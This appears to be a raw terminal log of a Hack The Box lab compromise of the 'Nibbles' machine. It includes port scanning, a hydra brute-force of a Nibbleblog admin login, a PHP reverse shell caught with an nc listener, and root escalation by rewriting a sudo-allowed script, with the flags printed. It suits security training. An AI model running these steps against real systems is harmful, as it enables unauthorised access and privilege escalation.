@@ -1,0 +1,391 @@
+arjun@broly:~/Documents/HacktheBox/retired/nibbles$ mkdir nmap                  
+arjun@broly:~/Documents/HacktheBox/retired/nibbles$ nmap -sC -sV -oA nmap/initial -vvv 10.10.10.75
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-22 15:38 CST                            
+NSE: Loaded 151 scripts for scanning.              
+NSE: Script Pre-scanning.                          
+NSE: Starting runlevel 1 (of 3) scan.              
+Initiating NSE at 15:38                            
+Completed NSE at 15:38, 0.00s elapsed              
+NSE: Starting runlevel 2 (of 3) scan.              
+Initiating NSE at 15:38                            
+Completed NSE at 15:38, 0.00s elapsed              
+NSE: Starting runlevel 3 (of 3) scan.              
+Initiating NSE at 15:38                            
+Completed NSE at 15:38, 0.00s elapsed              
+Initiating Ping Scan at 15:38                      
+Scanning 10.10.10.75 [2 ports]                     
+Completed Ping Scan at 15:38, 0.07s elapsed (1 total hosts)                                
+Initiating Parallel DNS resolution of 1 host. at 15:38                                     
+Completed Parallel DNS resolution of 1 host. at 15:38, 0.03s elapsed                       
+DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating Connect Scan at 15:38                   
+Scanning 10.10.10.75 [1000 ports]                  
+Discovered open port 80/tcp on 10.10.10.75         
+Discovered open port 22/tcp on 10.10.10.75         
+Completed Connect Scan at 15:38, 0.86s elapsed (1000 total ports)                          
+Initiating Service scan at 15:38                   
+Scanning 2 services on 10.10.10.75                 
+Completed Service scan at 15:38, 6.12s elapsed (2 services on 1 host)                      
+NSE: Script scanning 10.10.10.75.                  
+NSE: Starting runlevel 1 (of 3) scan.              
+Initiating NSE at 15:38                            
+Completed NSE at 15:38, 1.98s elapsed              
+NSE: Starting runlevel 2 (of 3) scan.              
+Initiating NSE at 15:38                            
+Completed NSE at 15:38, 0.24s elapsed              
+NSE: Starting runlevel 3 (of 3) scan.              
+Initiating NSE at 15:38                            
+Completed NSE at 15:38, 0.00s elapsed              
+Nmap scan report for 10.10.10.75                   
+Host is up, received syn-ack (0.055s latency).     
+Scanned at 2019-12-22 15:38:29 CST for 9s          
+Not shown: 998 closed ports                        
+Reason: 998 conn-refused                           
+PORT   STATE SERVICE REASON  VERSION               
+22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:                                     
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)                             
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)                            
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
+|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)                          
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk 
+80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))                                
+| http-methods:                                    
+|_  Supported Methods: GET HEAD POST OPTIONS       
+|_http-server-header: Apache/2.4.18 (Ubuntu)       
+|_http-title: Site doesn't have a title (text/html).                                       
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                    
+
+NSE: Script Post-scanning.                         
+NSE: Starting runlevel 1 (of 3) scan.              
+Initiating NSE at 15:38                            
+Completed NSE at 15:38, 0.00s elapsed              
+NSE: Starting runlevel 2 (of 3) scan.              
+Initiating NSE at 15:38                            
+Completed NSE at 15:38, 0.00s elapsed              
+NSE: Starting runlevel 3 (of 3) scan.              
+Initiating NSE at 15:38                            
+Completed NSE at 15:38, 0.00s elapsed              
+Read data files from: /usr/bin/../share/nmap       
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.79 seconds                                
+arjun@broly:~/Documents/HacktheBox/retired/nibbles$ unzip nibbleblog-v4.0.5.zip            
+Archive:  nibbleblog-v4.0.5.zip                    
+arjun@broly:~/Documents/HacktheBox/retired/nibbles$ ls                                     
+nibbleblog-v4.0.5  nibbleblog-v4.0.5.zip  nmap     
+arjun@broly:~/Documents/HacktheBox/retired/nibbles$ cd nibbleblog-v4.0.5/                  
+arjun@broly:~/Documents/HacktheBox/retired/nibbles/nibbleblog-v4.0.5$ ls                   
+admin  admin.php  content  COPYRIGHT.txt  feed.php  index.php  install.php  languages  LICENSE.txt  plugins  sitemap.php  themes  update.php
+arjun@broly:~/Documents/HacktheBox/retired/nibbles/nibbleblog-v4.0.5$ grep -R 4.0.5 . 
+./admin/boot/rules/98-constants.bit:define('NIBBLEBLOG_VERSION',               '4.0.5');
+./admin/js/tinymce/skins/lightgray/fonts/tinymce.svg:<glyph unicode="&#xe020;" d="M 352,32 L 480,32 L 512,96 L 512-32 L 320-32 L 320,75.107 C 385.556,103.349 432,173.688 432,256 C 432,363.216 353.201,447.133 256,447.133 C 158.797,447.133 80,363.217 80,256 C 80,173.688 126.443,103.349 192,75.107 L 192-32 L 0-32 L 0,96 L 32,32 L 160,32 L 160,48.295 C 66.185,81.525 0,161.996 0,256 C 0,379.712 114.615,480 256,480 C 397.385,480 512,379.712 512,256 C 512,161.996 445.815,81.525 352,48.295 L 352,32 Z"  />
+./admin/js/tinymce/skins/lightgray/fonts/tinymce.svg:<glyph unicode="&#xe016;" d="M 224,128L 288,128L 288,64L 224,64zM 352,352 C 369.673,352 384,337.673 384,320 L 384,224 L 288,160 L 224,160 L 224,192 L 320,256 L 320,288 L 160,288 L 160,352 L 352,352 ZM 256,432 C 200.441,432 148.208,410.364 108.922,371.078 C 69.636,331.792 48,279.559 48,224 C 48,168.441 69.636,116.208 108.922,76.922 C 148.208,37.636 200.441,16 256,16 C 311.559,16 363.792,37.636 403.078,76.922 C 442.364,116.208 464,168.441 464,224 C 464,279.559 442.364,331.792 403.078,371.078 C 363.792,410.364 311.559,432 256,432 Z M 256,480 L 256,480 C 397.385,480 512,365.385 512,224 C 512,82.615 397.385-32 256-32 C 114.615-32 0,82.615 0,224 C 0,365.385 114.615,480 256,480 Z"  />
+./admin/js/tinymce/skins/lightgray/fonts/tinymce.svg:<glyph unicode="&#xe00e;" d="M 112.5,256 C 174.356,256 224.5,205.855 224.5,144 C 224.5,82.144 174.356,32 112.5,32 C 50.644,32 0.5,82.144 0.5,144 L 0,160 C 0,283.712 100.288,384 224,384 L 224,320 C 181.263,320 141.083,303.357 110.863,273.137 C 105.046,267.319 99.737,261.129 94.948,254.627 C 100.667,255.527 106.528,256 112.5,256 ZM 400.5,256 C 462.355,256 512.5,205.855 512.5,144 C 512.5,82.144 462.355,32 400.5,32 C 338.645,32 288.5,82.144 288.5,144 L 288,160 C 288,283.712 388.288,384 512,384 L 512,320 C 469.263,320 429.083,303.357 398.863,273.137 C 393.045,267.319 387.736,261.129 382.947,254.627 C 388.667,255.527 394.527,256 400.5,256 Z"  />
+./admin/js/tinymce/skins/lightgray/fonts/tinymce.svg:<glyph unicode="&#xe002;" d="M 512,183.771l0,80.458 l-79.572,7.957c-4.093,15.021-10.044,29.274-17.605,42.49l 52.298,63.919L 410.595,435.12l-63.918-52.298
+./admin/js/tinymce/skins/lightgray/fonts/tinymce-small.svg:     c-52.901,0-95.786,45.585-95.786,101.818L 32,180.364C 32,292.829, 117.77,384, 223.572,384l0-58.182 c-36.55,0-70.913-15.13-96.758-42.602
+./admin/js/tinymce/skins/lightgray/fonts/tinymce-small.svg:     c-52.901,0-95.786,45.585-95.786,101.818L 288,180.364C 288,292.829, 373.77,384, 479.572,384l0-58.182 c-36.55,0-70.913-15.13-96.758-42.602
+./admin/js/tinymce/skins/lightgray/fonts/tinymce-small.svg:     c-59.833,0-116.083-23.3-158.392-65.608C 55.301,340.083, 32,283.833, 32,224c0-59.832, 23.301-116.084, 65.608-158.392
+./admin/js/tinymce/skins/lightgray/fonts/tinymce-small.svg:     C 162.925,250.95, 160,237.817, 160,224c0-53.020, 42.981-96, 96-96c 53.020,0, 96,42.98, 96,96c0,13.817-2.925,26.95-8.18,38.821
+./admin/js/tinymce/skins/lightgray/fonts/tinymce-small.svg:<glyph unicode="&#xe002;" d="M 512,183.771l0,80.458 l-79.572,7.957c-4.093,15.021-10.044,29.274-17.605,42.49l 52.298,63.919L 410.595,435.12l-63.918-52.298
+arjun@broly:~/Documents/HacktheBox/retired/nibbles/nibbleblog-v4.0.5$ grep -R 4.0.5 . | awk -F: '{print $1}' | uniq
+./admin/boot/rules/98-constants.bit     
+./admin/js/tinymce/skins/lightgray/fonts/tinymce.svg                            
+./admin/js/tinymce/skins/lightgray/fonts/tinymce-small.svg                      
+arjun@broly:~/Documents/HacktheBox/retired/nibbles/nibbleblog-v4.0.5$ vim ./admin/boot/rules/98-constants.bit 
+arjun@broly:~/Documents/HacktheBox/retired/nibbles/nibbleblog-v4.0.5$ searchsploit nibbleblog
+--------------------------------------- ----------------------------------------
+ Exploit Title                         |  Path                                  
+                                       | (/usr/share/exploitdb/)                
+--------------------------------------- ----------------------------------------
+Nibbleblog 3 - Multiple SQL Injections | exploits/php/webapps/35865.txt         
+Nibbleblog 4.0.3 - Arbitrary File Uplo | exploits/php/remote/38489.rb           
+--------------------------------------- ----------------------------------------
+Shellcodes: No Result                   
+arjun@broly:~/Documents/HacktheBox/retired/nibbles/nibbleblog-v4.0.5$ ls        
+38489.rb   content        index.php    LICENSE.txt  themes                      
+admin      COPYRIGHT.txt  install.php  plugins      update.php                  
+admin.php  feed.php       languages    sitemap.php                              
+arjun@broly:~/Documents/HacktheBox/retired/nibbles/nibbleblog-v4.0.5/$ cd ..  
+arjun@broly:~/Documents/HacktheBox/retired/nibbles/$ mkdir exploits  
+arjun@broly:~/Documents/HacktheBox/retired/nibbles/$ cd exploits/ 
+arjun@broly:~/Documents/HacktheBox/retired/nibbles/exploits$ searchsploit -m exploits/php/remote/38489.rb
+  Exploit: Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                
+      URL: https://www.exploit-db.com/exploits/38489                            
+     Path: /usr/share/exploitdb/exploits/php/remote/38489.rb                    
+File Type: Ruby script, ASCII text, with CRLF line terminators                  
+
+Copied to: /home/arjun/Documents/HacktheBox/retired/nibbles/exploits/38489.rb
+
+
+arjun@broly:~/Documents/HacktheBox/retired/nibbles/exploits$ ls
+38489.rb            
+arjun@broly:~/Documents/HacktheBox/retired/nibbles/exploits$ searchsploit -m exploits/php/webapps/35865.txt
+  Exploit: Nibbleblog 3 - Multiple SQL Injections  
+      URL: https://www.exploit-db.com/exploits/35865                                       
+     Path: /usr/share/exploitdb/exploits/php/webapps/35865.txt                             
+File Type: ASCII text, with CRLF line terminators  
+
+Copied to: /home/arjun/Documents/HacktheBox/retired/nibbles/exploits/35865.txt
+
+
+arjun@broly:~/Documents/HacktheBox/retired/nibbles/exploits$ ls
+35865.txt  38489.rb                                
+arjun@broly:~/Documents/HacktheBox/retired/nibbles/exploits$ vim 35865.txt 
+arjun@broly:~/Documents/HacktheBox/retired/nibbles/exploits$ rm 35865.txt 
+arjun@broly:~/Documents/HacktheBox/retired/nibbles/exploits$ ls
+38489.rb                                           
+arjun@broly:~/Documents/HacktheBox/retired/nibbles/exploits$ vim 38489.rb 
+arjun@broly:~/Documents/HacktheBox/retired/nibbles/exploits$ cd ..
+arjun@broly:~/Documents/HacktheBox/retired/nibbles$ mkdir bf                    
+arjun@broly:~/Documents/HacktheBox/retired/nibbles$ cd bf                       
+arjun@broly:~/Documents/HacktheBox/retired/nibbles/bf$ cp /usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou-50.txt ./
+arjun@broly:~/Documents/HacktheBox/retired/nibbles/bf$ ls                       
+rockyou-50.txt      
+arjun@broly:~/Documents/HacktheBox/retired/nibbles/bf$ wc -l rockyou-50.txt     
+9437 rockyou-50.txt 
+arjun@broly:~/Documents/HacktheBox/retired/nibbles/bf$ hydra -h                 
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]
+
+Options:            
+  -R        restore a previous aborted/crashed session                          
+  -I        ignore an existing restore file (don't wait 10 seconds)             
+  -S        perform an SSL connect      
+  -s PORT   if the service is on a different default port, define it here       
+  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE  
+  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE   
+  -x MIN:MAX:CHARSET  password bruteforce generation, type "-x -h" to get help  
+  -y        disable use of symbols in bruteforce, see above                     
+  -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login  
+  -u        loop around users, not passwords (effective! implied with -x)       
+  -C FILE   colon separated "login:pass" format, instead of -L/-P options       
+  -M FILE   list of servers to attack, one entry per line, ':' to specify port  
+  -o FILE   write found login/password pairs to FILE instead of stdout          
+  -b FORMAT specify the format for the -o FILE: text(default), json, jsonv1     
+  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)   
+  -t TASKS  run TASKS number of connects in parallel per target (default: 16)   
+  -T TASKS  run TASKS connects in parallel overall (for -M, default: 64)        
+  -w / -W TIME  wait time for a response (32) / between connects per thread (0) 
+  -c TIME   wait time per login attempt over all threads (enforces -t 1)        
+  -4 / -6   use IPv4 (default) / IPv6 addresses (put always in [] also in -M)   
+  -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode    
+  -O        use old SSL v2 and v3       
+  -q        do not print messages about connection errors                       
+  -U        service module usage details                                        
+  -h        more command line options (COMPLETE HELP)                           
+  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)       
+  service   the service to crack (see below for supported protocols)            
+  OPT       some service modules support additional input (-U for module help)  
+
+Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
+
+Hydra is a tool to guess/crack valid login/password pairs. Licensed under AGPL  
+v3.0. The newest version is always available at https://github.com/vanhauser-thc/thc-hydra
+Don't use in military or secret service organizations, or for illegal purposes. 
+These services were not compiled in: afp ncp oracle sapr3.                      
+
+Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.    
+E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
+     % export HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)   
+     % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080                     
+     % export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)                
+
+Examples:           
+  hydra -l user -P passlist.txt ftp://192.168.0.1                               
+  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN                   
+  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5             
+  hydra -l admin -p password ftp://[192.168.0.0/24]/                            
+  hydra -L logins.txt -P pws.txt -M targets.txt ssh                             
+arjun@broly:~/Documents/HacktheBox/retired/nibbles/bf$ hydra -l admin -P rockyou-50.txt 10.10.10.75 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect us
+ername"                                                                                    
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.         
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-12-22 16:30:18         
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 9437 login tries (l:1/p:9437), ~590 tries per task           
+[DATA] attacking http-post-form://10.10.10.75:80/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username                
+[80][http-post-form] host: 10.10.10.75   login: admin   password: nicole                   
+[80][http-post-form] host: 10.10.10.75   login: admin   password: 12345                    
+[80][http-post-form] host: 10.10.10.75   login: admin   password: monkey                   
+[80][http-post-form] host: 10.10.10.75   login: admin   password: jessica                  
+[80][http-post-form] host: 10.10.10.75   login: admin   password: 654321                   
+[80][http-post-form] host: 10.10.10.75   login: admin   password: daniel                   
+[80][http-post-form] host: 10.10.10.75   login: admin   password: lovely                   
+[80][http-post-form] host: 10.10.10.75   login: admin   password: michael                  
+[80][http-post-form] host: 10.10.10.75   login: admin   password: qwerty                   
+[80][http-post-form] host: 10.10.10.75   login: admin   password: ashley                   
+[80][http-post-form] host: 10.10.10.75   login: admin   password: iloveu                   
+[80][http-post-form] host: 10.10.10.75   login: admin   password: 111111                   
+[80][http-post-form] host: 10.10.10.75   login: admin   password: 000000                   
+[80][http-post-form] host: 10.10.10.75   login: admin   password: michelle                 
+[80][http-post-form] host: 10.10.10.75   login: admin   password: tigger                   
+[80][http-post-form] host: 10.10.10.75   login: admin   password: sunshine                 
+1 of 1 target successfully completed, 16 valid passwords found                             
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-12-22 16:30:19         
+arjun@broly:~/Documents/HacktheBox/retired/nibbles/bf$ hydra -l admin -P rockyou-50.txt 10.10.10.75 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username"               
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.         
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-12-22 16:30:24         
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 9437 login tries (l:1/p:9437), ~590 tries per task           
+[DATA] attacking http-post-form://10.10.10.75:80/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username                
+[80][http-post-form] host: 10.10.10.75   login: admin   password: 123456                   
+[80][http-post-form] host: 10.10.10.75   login: admin   password: 123456789                
+[80][http-post-form] host: 10.10.10.75   login: admin   password: princess                 
+[80][http-post-form] host: 10.10.10.75   login: admin   password: abc123                   
+[80][http-post-form] host: 10.10.10.75   login: admin   password: iloveyou                 
+[80][http-post-form] host: 10.10.10.75   login: admin   password: password                 
+[80][http-post-form] host: 10.10.10.75   login: admin   password: 1234567                  
+[80][http-post-form] host: 10.10.10.75   login: admin   password: nicole                   
+[80][http-post-form] host: 10.10.10.75   login: admin   password: 12345                    
+[80][http-post-form] host: 10.10.10.75   login: admin   password: 12345678                 
+[80][http-post-form] host: 10.10.10.75   login: admin   password: monkey                   
+[80][http-post-form] host: 10.10.10.75   login: admin   password: daniel                   
+[80][http-post-form] host: 10.10.10.75   login: admin   password: babygirl                 
+[80][http-post-form] host: 10.10.10.75   login: admin   password: 654321                   
+[80][http-post-form] host: 10.10.10.75   login: admin   password: jessica                  
+[80][http-post-form] host: 10.10.10.75   login: admin   password: lovely                   
+1 of 1 target successfully completed, 16 valid passwords found                             
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-12-22 16:30:25         
+arjun@broly:~/Documents/HacktheBox/retired/nibbles/bf$ cd ..                               
+arjun@broly:~/Documents/HacktheBox/retired/nibbles$ cp /opt/                               
+.cisco/         kingsoft/       microsoft/      Signal/                                    
+cisco/          libreoffice6.2/ resolve/        Teeth/                                     
+gobuster/       linux_privesc/  shell/                                                     
+arjun@broly:~/Documents/HacktheBox/retired/nibbles$ cp /opt/shell/php/php-reverse-shell.php .                    
+arjun@broly:~/Documents/HacktheBox/retired/nibbles$ ls                                     
+bf  exploits  nibbleblog-v4.0.5  nibbleblog-v4.0.5.zip  nmap  php-reverse-shell.php        
+arjun@broly:~/Documents/HacktheBox/retired/nibbles$ ifconfig                               
+eth0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500                                         
+        ether 2c:4d:54:27:8d:82  txqueuelen 1000  (Ethernet)                               
+        RX packets 0  bytes 0 (0.0 B)        
+        RX errors 0  dropped 0  overruns 0  frame 0                                        
+        TX packets 0  bytes 0 (0.0 B)        
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0                         
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536 
+        inet 127.0.0.1  netmask 255.0.0.0    
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>                                       
+        loop  txqueuelen 1000  (Local Loopback)                                            
+        RX packets 40190  bytes 106725836 (101.7 MiB)                                      
+        RX errors 0  dropped 0  overruns 0  frame 0                                        
+        TX packets 40190  bytes 106725836 (101.7 MiB)                                      
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0                         
+
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500                         
+        inet 10.10.14.24  netmask 255.255.254.0  destination 10.10.14.24                   
+        inet6 dead:beef:2::1016  prefixlen 64  scopeid 0x0<global>                         
+        inet6 fe80::c811:c06c:48f8:e3c1  prefixlen 64  scopeid 0x20<link>                  
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)   
+        RX packets 96537  bytes 14412606 (13.7 MiB)                                        
+        RX errors 0  dropped 0  overruns 0  frame 0                                        
+        TX packets 115726  bytes 9003940 (8.5 MiB)                                         
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0                         
+
+wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500                                
+        inet 192.168.0.12  netmask 255.255.255.0  broadcast 192.168.0.255                  
+        inet6 fe80::75bf:dc27:998a:f6a7  prefixlen 64  scopeid 0x20<link>                  
+        inet6 2605:6000:6285:7200:b564:d8d0:31eb:cdbf  prefixlen 64  scopeid 0x0<global>   
+        inet6 2605:6000:6285:7200::2  prefixlen 128  scopeid 0x0<global>                   
+        ether d0:57:7b:8c:5b:9a  txqueuelen 1000  (Ethernet)                               
+        RX packets 1188188  bytes 1468799908 (1.3 GiB)                                     
+        RX errors 0  dropped 0  overruns 0  frame 0                                        
+        TX packets 322676  bytes 59985327 (57.2 MiB)                                       
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0                         
+
+arjun@broly:~/Documents/HacktheBox/retired/nibbles$ vim php-reverse-shell.php              
+arjun@broly:~/Documents/HacktheBox/retired/nibbles$ nc -nvlp 9000                          
+listening on [any] 9000 ...                  
+connect to [10.10.14.24] from (UNKNOWN) [10.10.10.75] 56488                                
+Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux      
+ 17:47:30 up 11 min,  0 users,  load average: 0.00, 0.03, 0.03                             
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                        
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)                                   
+/bin/sh: 0: can't access tty; job control turned off                                       
+$ ls                  
+bin                   
+boot                  
+dev                   
+etc                   
+home                  
+initrd.img            
+initrd.img.old        
+lib                   
+lib64                 
+lost+found            
+media                 
+mnt                   
+opt                   
+proc                  
+root                  
+run                   
+sbin                  
+snap                  
+srv                   
+sys                   
+tmp                   
+usr                   
+var                   
+vmlinuz               
+vmlinuz.old           
+$ whoami              
+nibbler               
+$ cd /home            
+$ ls                  
+nibbler               
+$ cd nibbler          
+$ ls                  
+personal.zip          
+user.txt              
+$ cat user.txt        
+b02ff32bb332deba49eeaed21152c8d8             
+$ ls                  
+personal.zip          
+user.txt              
+$ unzip personal.zip  
+Archive:  personal.zip                       
+   creating: personal/                       
+   creating: personal/stuff/                 
+  inflating: personal/stuff/monitor.sh       
+$ ls                  
+personal              
+personal.zip          
+user.txt              
+$ cd personal         
+$ ls                  
+stuff                 
+$ cd stuff            
+$ ls                  
+monitor.sh            
+$ sudo -l             
+sudo: unable to resolve host Nibbles: Connection timed out                                 
+Matching Defaults entries for nibbler on Nibbles:                                          
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                   
+
+User nibbler may run the following commands on Nibbles:                                    
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh                               
+$ cat /etc/hosts      
+127.0.0.1       localhost                    
+127.0.1.1       Shocker                      
+
+# The following lines are desirable for IPv6 capable hosts                                 
+::1     localhost ip6-localhost ip6-loopback 
+ff02::1 ip6-allnodes  
+ff02::2 ip6-allrouters                       
+$ echo "#!/bin/sh     
+> bash" > monitor.sh  
+$ cat monitor.sh      
+#!/bin/sh             
+bash                  
+$ chmod +x monitor.sh 
+$ sudo ./monitor.sh   
+sudo: unable to resolve host Nibbles: Connection timed out                                 
+ls                    
+monitor.sh            
+ls                    
+monitor.sh            
+cd /root              
+ls                    
+root.txt              
+cat root.txt          
+b6d745c0dfb6457c55591efc898ef88c             
